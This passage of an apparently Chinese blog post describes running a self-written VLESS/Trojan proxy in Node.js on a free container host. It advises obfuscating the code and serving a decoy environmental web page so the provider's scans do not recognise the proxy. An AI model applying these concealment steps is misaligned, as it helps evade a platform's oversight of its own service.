b, i, a) =\u0026gt; (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b =\u0026gt; b.readUInt16BE(0).toString(16)).join(\u0026#39;:\u0026#39;) : \u0026#39;\u0026#39;)); ws.send(new Uint8Array([VERSION, 0])); const duplex = createWebSocketStream(ws); resolveHost(host) .then(resolvedIP =\u0026gt; { net.connect({ host: resolvedIP, port }, function() { this.write(msg.slice(i)); duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }) .catch(error =\u0026gt; { net.connect({ host, port }, function() { this.write(msg.slice(i)); duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); return true; } // Tro-jan处理 function handleTrojanConnection(ws, msg) { try { if (msg.length \u0026lt; 58) return false; const receivedPasswordHash = msg.slice(0, 56).toString(); const possiblePasswords = [ UUID, ]; let matchedPassword = null; for (const pwd of possiblePasswords) { const hash = crypto.createHash(\u0026#39;sha224\u0026#39;).update(pwd).digest(\u0026#39;hex\u0026#39;); if (hash === receivedPasswordHash) { matchedPassword = pwd; break; } } if (!matchedPassword) return false; let offset = 56; if (msg[offset] === 0x0d \u0026amp;\u0026amp; msg[offset + 1] === 0x0a) { offset += 2; } const cmd = msg[offset]; if (cmd !== 0x01) return false; offset += 1; const atyp = msg[offset]; offset += 1; let host, port; if (atyp === 0x01) { host = msg.slice(offset, offset + 4).join(\u0026#39;.\u0026#39;); offset += 4; } else if (atyp === 0x03) { const hostLen = msg[offset]; offset += 1; host = msg.slice(offset, offset + hostLen).toString(); offset += hostLen; } else if (atyp === 0x04) { host = msg.slice(offset, offset + 16).reduce((s, b, i, a) =\u0026gt; (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []) .map(b =\u0026gt; b.readUInt16BE(0).toString(16)).join(\u0026#39;:\u0026#39;); offset += 16; } else { return false; } port = msg.readUInt16BE(offset); offset += 2; if (offset \u0026lt; msg.length \u0026amp;\u0026amp; msg[offset] === 0x0d \u0026amp;\u0026amp; msg[offset + 1] === 0x0a) { offset += 2; } const duplex = createWebSocketStream(ws); resolveHost(host) .then(resolvedIP =\u0026gt; { net.connect({ host: resolvedIP, port }, function() { if (offset \u0026lt; msg.length) { this.write(msg.slice(offset)); } duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }) .catch(error =\u0026gt; { net.connect({ host, port }, function() { if (offset \u0026lt; msg.length) { this.write(msg.slice(offset)); } duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); return true; } catch (error) { return false; } } // Ws 连接处理 wss.on(\u0026#39;connection\u0026#39;, (ws, req) =\u0026gt; { const url = req.url || \u0026#39;\u0026#39;; ws.once(\u0026#39;message\u0026#39;, msg =\u0026gt; { if (msg.length \u0026gt; 17 \u0026amp;\u0026amp; msg[0] === 0) { const id = msg.slice(1, 17); const isVless = id.every((v, i) =\u0026gt; v == parseInt(uuid.substr(i * 2, 2), 16)); if (isVless) { if (!handleVlessConnection(ws, msg)) { ws.close(); } return; } } if (!handleTrojanConnection(ws, msg)) { ws.close(); } }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); httpServer.listen(PORT, () =\u0026gt; { const scheme = tlsOptions ? \u0026#39;HTTPS/WSS\u0026#39; : \u0026#39;HTTP/WS\u0026#39;; console.log(`Server is running on ${scheme} port ${PORT}`); }); 这样就齐活了，index.js 需要修改的地方\nconst DOMAIN = process.env.DOMAIN || \u0026#39;1234.abc.com\u0026#39;; // 填写域名 const SUB_PATH = process.env.SUB_PATH || \u0026#39;sub\u0026#39;; // 获取节点的订阅路径 const PORT = process.env.PORT || 7860; 域名我们要填写自己的域名 路径要换掉，缺省是sub，也就是订阅地址是 https://xxx.aaa.bbb/sub , 最好换成自己的地址 端口也选这个服务器给你开的端口，我的是10407 然后改好了，别急着贴进去\n去到 https://obfuscator.io/legacy-playground\n贴进去代码，混淆一下，弄成谁也认不得的模样，然后Copy，再贴进去\n最后运行\n看到Online就好了\n那域名解析到这个IP，打开https看看：\n那再打开 https://www.aaa.bbb.com/sub , 如果改了sub，那就是别的路径，显示一堆base64加密的字符串\n从v2rayN导入，有两个代理，一个是vless，一个是trojan，就可以用了\n关键是这么做的原理，就是用index.js完整实现了vless和trojan的功能，加了证书，并且做了混淆和伪装\n这样很自然，比在容器里跑singbox安全，不容易被扫描到\n当然，这个网站的速度不太行，所以只是一个玩具，没有套大善人Cloudflare的CDN\n自己用的是 huggingface.co + CF worker，速度还是可以的，下一篇写出来。\n代码放在：https://github.com/zhangrr/js-server\n大家自行取用吧\n","permalink":"https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/","summary":"\u003cp\u003e有了Codex的加持，也渐渐得疯狂起来了，本身运维就是全干，对系统的各个点把控就比较精准\u003c/p\u003e\n\u003cp\u003e这次准备薅羊毛的是 wispbyte.com , 是欧洲的一个厂家\u003c/p\u003e\n\u003cp\u003e它可以免费建立一个server，准确的来说是一个容器，并且暴露一个端口出来\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260102172243875\" loading=\"lazy\" src=\"/posts/20260101-wispbyte.com_vless_trojan/image-20260102172243875.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那先Create Server，Server Name 和 Server Description就都写  god01 好了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260102172435838\" loading=\"lazy\" src=\"/posts/20260101-wispbyte.com_vless_trojan/image-20260102172435838.png\"\u003e\u003c/p\u003e\n\u003cp\u003eServer Type当然选Free Plan的，运行环境就选NodeJS\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260102172459520\" loading=\"lazy\" src=\"/posts/20260101-wispbyte.com_vless_trojan/image-20260102172459520.png\"\u003e\u003c/p\u003e\n\u003cp\u003e选完就按最下面的\u003cstrong\u003e创建\u003c/strong\u003e即可。\u003c/p\u003e\n\u003cp\u003e建好了那就去到 server的manage管理界面，下面有个Startup：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260102172759672\" loading=\"lazy\" src=\"/posts/20260101-wispbyte.com_vless_trojan/image-20260102172759672.png\"\u003e\u003c/p\u003e\n\u003cp\u003e分析那句命令，意思很简单，如果配了git，就去拉代码，如果有存在npm的package.json，就先npm install安装，最后，运行index.js\u003c/p\u003e\n\u003cp\u003e下面是Docker Image，本来以为是可以随便引用别处的镜像，结果是不能，只能选固定的，那就选不太激进的 nodejs_22 ，保存好\u003c/p\u003e\n\u003cp\u003e然后就什么都不用动了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260102173016033\" loading=\"lazy\" src=\"/posts/20260101-wispbyte.com_vless_trojan/image-20260102173016033.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后去到Files选项，缺省路径是 /hoe/container/\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260102173221647\" loading=\"lazy\" src=\"/posts/20260101-wispbyte.com_vless_trojan/image-20260102173221647.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面图是已经弄好的，如果是新服务器，是空无一物的\u003c/p\u003e\n\u003cp\u003e我们只需要准备5个文件和一个域名：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003etls.crt 证书文件，用let\u0026rsquo;s encrypt申请\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003etls.key 密钥文件，用let\u0026rsquo;s encrypt申请\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eindex.html 用来装饰的环保单页面，如果不加，就会显示hello world，太假了，可以让 gemini 给你生成一个，代码如下：\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;html \u003cspan class=\"nv\"\u003elang\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;en\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;meta \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;UTF-8\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;meta \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;viewport\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;title\u0026gt;Green Network - Protect Earth\u0026lt;/title\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;style\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        * \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-sizing: border-box\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-family: \u003cspan class=\"s1\"\u003e\u0026#39;Segoe UI\u0026#39;\u003c/span\u003e, Tahoma, Geneva, Verdana, sans-serif\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        :root \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --primary: \u003cspan class=\"c1\"\u003e#2e7d32;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --secondary: \u003cspan class=\"c1\"\u003e#4caf50;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --accent: \u003cspan class=\"c1\"\u003e#8bc34a;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --light: \u003cspan class=\"c1\"\u003e#e8f5e9;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --dark: \u003cspan class=\"c1\"\u003e#1b5e20;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --text: \u003cspan class=\"c1\"\u003e#333333;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            --white: \u003cspan class=\"c1\"\u003e#ffffff;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        body \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--light\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--text\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            line-height: 1.7\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly increased line height \u003cspan class=\"k\"\u003efor\u003c/span\u003e readability */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 16px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        header \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background: rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e46, 125, 50, 0.95\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly transparent primary color */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 1rem 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: sticky\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            top: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            z-index: 100\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 4px 12px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Enhanced shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .container \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 90%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            max-width: 1200px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin: \u003cspan class=\"m\"\u003e0\u003c/span\u003e auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .nav-container \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            justify-content: space-between\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            align-items: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .logo \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            align-items: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gap: 10px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-weight: 700\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .logo i \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        nav ul \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            list-style: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        nav ul li \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-left: 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        nav ul li a \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-decoration: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-weight: 500\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: all 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 0.5rem 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: relative\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        nav ul li a:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        nav ul li a::after \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            content: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: absolute\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            bottom: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            left: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 2px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: width 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        nav ul li a:hover::after \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 100%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .hero \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background: linear-gradient\u003cspan class=\"o\"\u003e(\u003c/span\u003ergba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.6\u003cspan class=\"o\"\u003e)\u003c/span\u003e, rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.4\u003cspan class=\"o\"\u003e))\u003c/span\u003e, url\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2073\u0026amp;q=80\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-size: cover\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-position: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 80vh\u003cspan 